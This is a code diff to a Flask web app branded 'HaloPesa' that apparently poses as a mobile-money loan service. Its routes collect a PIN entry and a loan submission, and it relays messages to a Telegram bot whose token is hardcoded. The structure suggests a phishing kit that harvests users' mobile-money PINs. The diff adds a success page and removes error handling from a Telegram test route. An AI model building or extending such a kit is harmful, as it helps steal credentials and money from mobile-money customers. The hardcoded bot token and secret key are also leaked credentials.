@@ -16,7 +16,7 @@ app.secret_key = 'halopesa-new-2024'
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 CHAT_ID   = os.environ.get('CHAT_ID')
 
-# Fallback for local testing (use your new token here)
+# Fallback for local testing (use your token)
 if not BOT_TOKEN:
     BOT_TOKEN = '8892736098:AAEtdKvOXalb0Gc_3kAlSRWvdMqIhS3aAgw'
 if not CHAT_ID:
@@ -93,14 +93,14 @@ def pin_entry():
 def approve():
     return render_template('approve.html')
 
+@app.route('/success')
+def success():
+    return render_template('success.html')
+
 @app.route('/test-telegram')
 def test_telegram():
-    """Test route to check Telegram integration."""
-    try:
-        send_telegram("🚀 Test message from HaloPesa! Your bot is working.")
-        return "Test message sent! Check your Telegram."
-    except Exception as e:
-        return f"Error: {e}"
+    send_telegram("🚀 Test message from HaloPesa! Your bot is working.")
+    return "Test message sent! Check your Telegram."
 
 @app.route('/api/submit_loan', methods=['POST'])
 def submit_loan():
